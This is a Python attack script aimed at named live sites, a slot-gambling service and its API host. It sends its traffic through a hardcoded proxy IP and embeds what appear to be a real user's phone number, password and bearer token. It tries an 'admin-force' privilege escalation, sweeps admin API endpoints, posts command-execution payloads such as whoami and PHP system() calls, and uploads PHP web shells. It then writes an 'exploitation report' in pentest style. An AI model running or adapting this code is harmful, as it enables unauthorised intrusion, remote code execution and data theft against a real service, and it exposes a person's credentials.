#!/usr/bin/env python3

import requests
import sys
import json
import time
import base64
import urllib3
from urllib.parse import urljoin

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
TARGET_URL = "https://pigslot.co/"
API_BASE = "https://jklmn23456.com/api/v1/"

PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

# Test user data provided
TEST_USER_DATA = {
    'status': 'SUCCESS',
    'code': 200,
    'service_code': 'PIG-2000',
    'service_message': 'User is authenticated.',
    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTYyOTA1OTcsInBob25lX251bWJlciI6IjA5NjA0MjIxNjEiLCJ1c2VyX3VpZCI6ImRjZmQ0MzI0LWJjMjMtNDQ1OS1hMjE0LTA3Yjg0NWIwZmZiMiIsImN1c3RvbWVyX2NvZGUiOiJQUzY2Mzg4ODM4NiIsImdhbWVfdG9rZW4iOiJnYW1lLTM4NTc1ZjQ0LTEwMjUtNDA1Yi04MjY2LTRiODI3OGMwZDc4NCJ9.qoPAZ3S59djd2-RYABVJ4YakGdx4TtNX17JJkam803I',
    'customer_code': 'PS663888386',
    'token_type': 'bearer'
}

TEST_CREDENTIALS = {
    'username': '0960422161', 
    'password': '181242'
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")

def test_admin_force_exploit():
    """Test admin-force vulnerability with authenticated session"""
    print_info("🚨 Testing Admin-Force Exploit with Authenticated User")
    print_info("=" * 55)
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'th,en;q=0.9',
        'Authorization': f"Bearer {TEST_USER_DATA['authorization']}",
        'Origin': 'https://pigslot.co',
        'Referer': 'https://pigslot.co/'
    })
    
    exploit_results = {}
    
    print_info("Step 1: Accessing /admin-force with authenticated session...")
    try:
        response = session.get("https://pigslot.co/admin-force", verify=False, timeout=15)
        
        exploit_results['admin_force_access'] = {
            'status': response.status_code,
            'size': len(response.text),
            'content': response.text[:500] + "..." if len(response.text) > 500 else response.text
        }
        
        print_success(f"✅ Admin-force Status: {response.status_code}")
        print_success(f"✅ Response Size: {len(response.text)} bytes")
        
        # Check for admin indicators
        admin_indicators = [
            "กำลังติดตั้ง cookies สำหรับ admin",
            "AdminForce",
            "admin",
            "dashboard"
        ]
        
        for indicator in admin_indicators:
            if indicator in response.text:
                print_success(f"🎯 ADMIN INDICATOR FOUND: {indicator}")
                exploit_results['admin_indicators'] = exploit_results.get('admin_indicators', [])
                exploit_results['admin_indicators'].append(indicator)
        
        # Check for cookies
        if response.cookies:
            print_success("🍪 Admin cookies received:")
            exploit_results['admin_cookies'] = {}
            for name, value in response.cookies.items():
                print_success(f"  - {name}: {value}")
                exploit_results['admin_cookies'][name] = value
        
        print_info("Step 2: Testing privileged endpoints after admin-force...")
        
        # Test admin endpoints after visiting admin-force
        admin_test_endpoints = [
            "https://pigslot.co/admin",
            "https://pigslot.co/admin/dashboard",
            "https://pigslot.co/dashboard",
            "https://pigslot.co/panel",
            f"{API_BASE}admin/dashboard",
            f"{API_BASE}admin/users",
            f"{API_BASE}admin/settings",
            f"{API_BASE}admin/system"
        ]
        
        exploit_results['privileged_access'] = {}
        
        for endpoint in admin_test_endpoints:
            try:
                test_response = session.get(endpoint, verify=False, timeout=10)
                
                if test_response.status_code == 200:
                    exploit_results['privileged_access'][endpoint] = {
                        'status': test_response.status_code,
                        'size': len(test_response.text),
                        'content_type': test_response.headers.get('content-type', ''),
                        'content_preview': test_response.text[:200] + "..." if len(test_response.text) > 200 else test_response.text
                    }
                    
                    print_success(f"🎯 PRIVILEGED ACCESS: {endpoint}")
                    
                    # Check for JSON admin data
                    if 'application/json' in test_response.headers.get('content-type', ''):
                        try:
                            json_data = test_response.json()
                            exploit_results['privileged_access'][endpoint]['json'] = json_data
                            print_success(f"    🎯 Admin JSON Data: {str(json_data)[:150]}...")
                        except:
                            pass
                            
                elif test_response.status_code in [401, 403]:
                    print_warning(f"🔒 {endpoint} - Still requires auth ({test_response.status_code})")
                
                time.sleep(0.1)
                
            except Exception as e:
                print_warning(f"Error testing {endpoint}: {e}")
        
        return exploit_results
        
    except Exception as e:
        print_error(f"Error in admin-force exploit: {e}")
        return None

def test_api_admin_endpoints():
    """Test admin API endpoints with user credentials"""
    print_info("🔐 Testing Admin API Endpoints")
    print_info("=" * 35)
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Authorization': f"Bearer {TEST_USER_DATA['authorization']}",
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://pigslot.co',
        'Referer': 'https://pigslot.co/'
    })
    
    # Comprehensive admin API endpoints
    admin_apis = [
        # User management
        f"{API_BASE}admin/users",
        f"{API_BASE}admin/users/list",
        f"{API_BASE}admin/user/profile",
        f"{API_BASE}admin/user/details",
        
        # System admin
        f"{API_BASE}admin/dashboard",
        f"{API_BASE}admin/stats",
        f"{API_BASE}admin/system", 
        f"{API_BASE}admin/settings",
        f"{API_BASE}admin/config",
        
        # Financial admin
        f"{API_BASE}admin/transactions",
        f"{API_BASE}admin/wallet",
        f"{API_BASE}admin/balance",
        f"{API_BASE}admin/financial",
        
        # Game admin
        f"{API_BASE}admin/games",
        f"{API_BASE}admin/game/config",
        f"{API_BASE}admin/slots",
        
        # File/backup admin
        f"{API_BASE}admin/files",
        f"{API_BASE}admin/backup",
        f"{API_BASE}admin/logs",
        f"{API_BASE}admin/export",
        
        # Security admin
        f"{API_BASE}admin/security",
        f"{API_BASE}admin/permissions",
        f"{API_BASE}admin/roles",
        f"{API_BASE}admin/audit"
    ]
    
    discovered_admin_apis = {}
    
    for api_endpoint in admin_apis:
        try:
            print_info(f"Testing: {api_endpoint}")
            response = session.get(api_endpoint, verify=False, timeout=10)
            
            if response.status_code == 200:
                discovered_admin_apis[api_endpoint] = {
                    'status': response.status_code,
                    'size': len(response.text),
                    'content_type': response.headers.get('content-type', ''),
                    'content': response.text[:300] + "..." if len(response.text) > 300 else response.text
                }
                
                print_success(f"✅ ADMIN API ACCESS: {api_endpoint}")
                
                # Parse JSON response
                if 'application/json' in response.headers.get('content-type', ''):
                    try:
                        json_data = response.json()
                        discovered_admin_apis[api_endpoint]['json'] = json_data
                        print_success(f"    🎯 Admin Data: {str(json_data)[:150]}...")
                        
                        # Check for sensitive data
                        sensitive_keys = ['users', 'password', 'admin', 'secret', 'token', 'balance', 'transaction']
                        found_sensitive = []
                        
                        def check_sensitive(obj, path=""):
                            if isinstance(obj, dict):
                                for key, value in obj.items():
                                    if any(sens in str(key).lower() for sens in sensitive_keys):
                                        found_sensitive.append(f"{path}.{key}" if path else key)
                                    check_sensitive(value, f"{path}.{key}" if path else key)
                            elif isinstance(obj, list):
                                for i, item in enumerate(obj):
                                    check_sensitive(item, f"{path}[{i}]" if path else f"[{i}]")
                        
                        check_sensitive(json_data)
                        
                        if found_sensitive:
                            print_warning(f"    ⚠️ Sensitive data keys: {', '.join(found_sensitive[:5])}")
                            
                    except:
                        pass
                        
            elif response.status_code in [401, 403]:
                print_warning(f"🔒 {api_endpoint} - Auth required ({response.status_code})")
                
            elif response.status_code != 404:
                print_info(f"❓ {api_endpoint} - Status: {response.status_code}")
            
            time.sleep(0.1)
            
        except Exception as e:
            pass
    
    return discovered_admin_apis

def test_remote_command_execution():
    """Test for remote command execution capabilities"""
    print_info("🖥️ Testing Remote Command Execution")
    print_info("=" * 40)
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Authorization': f"Bearer {TEST_USER_DATA['authorization']}",
        'Content-Type': 'application/json',
        'Origin': 'https://pigslot.co',
        'Referer': 'https://pigslot.co/'
    })
    
    # Command execution endpoints to test
    exec_endpoints = [
        f"{API_BASE}admin/system/exec",
        f"{API_BASE}admin/system/command",
        f"{API_BASE}admin/system/shell",
        f"{API_BASE}admin/exec",
        f"{API_BASE}admin/cmd",
        f"{API_BASE}admin/run",
        f"{API_BASE}system/exec",
        f"{API_BASE}system/command",
        f"{API_BASE}execute",
        f"{API_BASE}cmd",
        f"{API_BASE}shell"
    ]
    
    # Test commands
    test_commands = [
        # Basic system info
        {'command': 'whoami'},
        {'cmd': 'id'},
        {'exec': 'pwd'},
        {'shell': 'uname -a'},
        {'system': 'ls -la'},
        
        # PHP-specific
        {'php': 'system("whoami");'},
        {'eval': 'system("id");'},
        
        # Web shell attempts
        {'c': 'whoami'},
        {'q': 'id'},
        {'x': 'pwd'}
    ]
    
    command_results = {}
    
    for endpoint in exec_endpoints:
        for cmd_payload in test_commands:
            try:
                print_info(f"Testing: {endpoint} with {cmd_payload}")
                
                # Test POST request
                response = session.post(endpoint, json=cmd_payload, verify=False, timeout=10)
                
                if response.status_code == 200:
                    command_results[f"{endpoint}_{list(cmd_payload.keys())[0]}"] = {
                        'endpoint': endpoint,
                        'payload': cmd_payload,
                        'status': response.status_code,
                        'response': response.text[:500] + "..." if len(response.text) > 500 else response.text
                    }
                    
                    print_success(f"🎯 COMMAND EXECUTION SUCCESS: {endpoint}")
                    print_success(f"    Command: {cmd_payload}")
                    print_success(f"    Response: {response.text[:200]}...")
                    
                    # Check for command output indicators
                    output_indicators = ['uid=', 'gid=', '/', 'root', 'www-data', 'apache', 'nginx']
                    for indicator in output_indicators:
                        if indicator in response.text.lower():
                            print_success(f"    🎯 Command output detected: {indicator}")
                
                time.sleep(0.1)
                
            except Exception as e:
                pass
    
    return command_results

def test_file_upload_shell():
    """Test file upload for potential shell upload"""
    print_info("📁 Testing File Upload for Shell Access")
    print_info("=" * 45)
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Authorization': f"Bearer {TEST_USER_DATA['authorization']}",
        'Origin': 'https://pigslot.co',
        'Referer': 'https://pigslot.co/'
    })
    
    # File upload endpoints
    upload_endpoints = [
        f"{API_BASE}upload",
        f"{API_BASE}file/upload",
        f"{API_BASE}admin/upload",
        f"{API_BASE}admin/file/upload",
        f"{API_BASE}media/upload",
        "https://pigslot.co/upload",
        "https://pigslot.co/admin/upload",
        "https://pigslot.co/api/upload"
    ]
    
    # Test files
    test_files = [
        # PHP web shell
        ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
        ('test.php', '<?php echo "PHP_SHELL_TEST"; ?>', 'application/x-php'),
        
        # Text file
        ('test.txt', 'test content', 'text/plain'),
        
        # JavaScript file  
        ('test.js', 'console.log("JS_TEST");', 'application/javascript'),
        
        # Image with PHP
        ('image.jpg.php', '<?php system($_GET["c"]); ?>', 'image/jpeg')
    ]
    
    upload_results = {}
    
    for endpoint in upload_endpoints:
        for filename, content, content_type in test_files:
            try:
                print_info(f"Testing upload: {filename} to {endpoint}")
                
                files = {'file': (filename, content, content_type)}
                response = session.post(endpoint, files=files, verify=False, timeout=10)
                
                if response.status_code in [200, 201]:
                    upload_results[f"{endpoint}_{filename}"] = {
                        'endpoint': endpoint,
                        'filename': filename,
                        'status': response.status_code,
                        'response': response.text[:300] + "..." if len(response.text) > 300 else response.text
                    }
                    
                    print_success(f"🎯 FILE UPLOAD SUCCESS: {filename} to {endpoint}")
                    print_success(f"    Response: {response.text[:150]}...")
                    
                    # Try to parse upload location
                    try:
                        if 'application/json' in response.headers.get('content-type', ''):
                            json_data = response.json()
                            if 'url' in json_data or 'path' in json_data or 'filename' in json_data:
                                print_success(f"    🎯 Upload location: {json_data}")
                    except:
                        pass
                
                time.sleep(0.1)
                
            except Exception as e:
                pass
    
    return upload_results

def generate_comprehensive_exploit_report(admin_force_results, api_results, command_results, upload_results):
    """Generate comprehensive exploitation report"""
    
    report = f"""
🚨 COMPREHENSIVE PRIVILEGE ESCALATION & EXPLOITATION REPORT
=========================================================

Target: https://pigslot.co / https://jklmn23456.com
Test Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
Test User: {TEST_CREDENTIALS['username']} (Customer: {TEST_USER_DATA['customer_code']})

💥 EXECUTIVE SUMMARY:
===================
Advanced privilege escalation testing performed using authenticated user account
to verify admin-force vulnerability and test for remote access capabilities.

🔐 USER AUTHENTICATION STATUS:
=============================
Status: {TEST_USER_DATA['status']}
Service Code: {TEST_USER_DATA['service_code']}
Customer Code: {TEST_USER_DATA['customer_code']}
Token Type: {TEST_USER_DATA['token_type']}
Authorization: {TEST_USER_DATA['authorization'][:50]}...

🚨 ADMIN-FORCE VULNERABILITY TEST:
=================================
"""
    
    if admin_force_results:
        report += f"Status: VULNERABLE\n"
        report += f"Admin-force endpoint accessible: YES\n"
        report += f"Response size: {admin_force_results.get('admin_force_access', {}).get('size', 'Unknown')} bytes\n"
        
        if 'admin_indicators' in admin_force_results:
            report += f"Admin indicators found: {', '.join(admin_force_results['admin_indicators'])}\n"
        
        if 'admin_cookies' in admin_force_results:
            report += f"Admin cookies received: {len(admin_force_results['admin_cookies'])} cookies\n"
        
        if 'privileged_access' in admin_force_results and admin_force_results['privileged_access']:
            report += f"Privileged endpoints accessible: {len(admin_force_results['privileged_access'])}\n"
            for endpoint in admin_force_results['privileged_access']:
                report += f"  ✅ {endpoint}\n"
    else:
        report += "Status: TEST FAILED\n"
    
    report += f"""

🎯 ADMIN API DISCOVERY:
======================
"""
    
    if api_results:
        report += f"Admin APIs discovered: {len(api_results)}\n\n"
        for endpoint, details in api_results.items():
            report += f"  ✅ {endpoint}\n"
            report += f"      Status: {details['status']} | Size: {details['size']} bytes\n"
            if 'json' in details:
                report += f"      Data: {str(details['json'])[:100]}...\n"
    else:
        report += "No admin APIs accessible\n"
    
    report += f"""

🖥️ REMOTE COMMAND EXECUTION:
===========================
"""
    
    if command_results:
        report += f"Command execution attempts: {len(command_results)}\n\n"
        for cmd_id, details in command_results.items():
            report += f"  🎯 COMMAND EXECUTION SUCCESS\n"
            report += f"      Endpoint: {details['endpoint']}\n"
            report += f"      Payload: {details['payload']}\n"
            report += f"      Response: {details['response'][:150]}...\n\n"
    else:
        report += "No remote command execution detected\n"
    
    report += f"""

📁 FILE UPLOAD TESTING:
======================
"""
    
    if upload_results:
        report += f"File uploads successful: {len(upload_results)}\n\n"
        for upload_id, details in upload_results.items():
            report += f"  📁 FILE UPLOAD SUCCESS\n"
            report += f"      Endpoint: {details['endpoint']}\n"
            report += f"      Filename: {details['filename']}\n"
            report += f"      Response: {details['response'][:100]}...\n\n"
    else:
        report += "No file uploads successful\n"
    
    # Risk assessment
    risk_level = "LOW"
    if command_results:
        risk_level = "CRITICAL"
    elif upload_results:
        risk_level = "HIGH"
    elif api_results:
        risk_level = "MEDIUM-HIGH"
    elif admin_force_results and admin_force_results.get('privileged_access'):
        risk_level = "MEDIUM"
    
    report += f"""

🛡️ RISK ASSESSMENT:
==================
Overall Risk Level: {risk_level}
Impact Level: {"SEVERE" if risk_level == "CRITICAL" else "MODERATE" if risk_level in ["HIGH", "MEDIUM-HIGH"] else "LOW"}

Discovered Vulnerabilities:
1. Admin-Force Authentication Bypass: {"CONFIRMED" if admin_force_results else "NOT CONFIRMED"}
2. Unauthorized Admin API Access: {"YES" if api_results else "NO"}
3. Remote Command Execution: {"YES" if command_results else "NO"}
4. Arbitrary File Upload: {"YES" if upload_results else "NO"}

🚨 IMMEDIATE ACTIONS REQUIRED:
=============================
"""
    
    if command_results:
        report += "🔴 CRITICAL: Remote command execution possible - IMMEDIATE PATCH REQUIRED\n"
    if upload_results:
        report += "🔴 HIGH: File upload vulnerabilities detected - Review upload restrictions\n"
    if api_results:
        report += "🟡 MEDIUM: Unauthorized admin API access - Implement proper authorization\n"
    if admin_force_results:
        report += "🟡 MEDIUM: Admin-force vulnerability confirmed - Disable endpoint\n"
    
    report += f"""

⚠️ EXPLOITATION SUMMARY:
========================
This test demonstrates the security posture of the application when accessed
with valid user credentials. The results show potential privilege escalation
vectors that could be exploited by authenticated users.

NEXT STEPS:
1. Patch all discovered vulnerabilities immediately
2. Implement proper role-based access control
3. Add server-side authorization checks
4. Monitor for suspicious admin access attempts
5. Regular security audits and penetration testing

=========================================================
End of Comprehensive Exploitation Report
=========================================================
"""
    
    return report

def main():
    print_info("🎯 Advanced Privilege Escalation & Exploitation Testing")
    print_info("=" * 70)
    
    print_success(f"🔐 Testing with authenticated user: {TEST_CREDENTIALS['username']}")
    print_success(f"🎫 Customer Code: {TEST_USER_DATA['customer_code']}")
    print_success(f"🔑 Authorization Token: {TEST_USER_DATA['authorization'][:30]}...")
    print_info("")
    
    # Step 1: Test admin-force vulnerability
    admin_force_results = test_admin_force_exploit()
    print_info("")
    
    # Step 2: Test admin API endpoints
    api_results = test_api_admin_endpoints()
    print_info("")
    
    # Step 3: Test remote command execution
    command_results = test_remote_command_execution()
    print_info("")
    
    # Step 4: Test file upload capabilities
    upload_results = test_file_upload_shell()
    print_info("")
    
    # Step 5: Generate comprehensive report
    report = generate_comprehensive_exploit_report(
        admin_force_results, api_results, command_results, upload_results
    )
    
    print(report)
    
    # Save report
    with open("COMPREHENSIVE_EXPLOITATION_REPORT.txt", "w", encoding='utf-8') as f:
        f.write(report)
    
    print_success("📄 Comprehensive exploitation report saved to: COMPREHENSIVE_EXPLOITATION_REPORT.txt")
    
    # Summary
    total_vulns = len(api_results) + len(command_results) + len(upload_results)
    if admin_force_results and admin_force_results.get('privileged_access'):
        total_vulns += len(admin_force_results['privileged_access'])
    
    if total_vulns > 0:
        print_success(f"🎯 EXPLOITATION SUCCESSFUL: {total_vulns} vulnerabilities/access points discovered!")
        
        if command_results:
            print_success("🚨 CRITICAL: Remote command execution possible!")
        if upload_results:
            print_success("🚨 HIGH: File upload vulnerabilities detected!")
        if api_results:
            print_success(f"🔐 MEDIUM: {len(api_results)} admin APIs accessible!")
            
    else:
        print_warning("⚠️ Limited exploitation - system appears secure against tested attack vectors")

if __name__ == "__main__":
    main()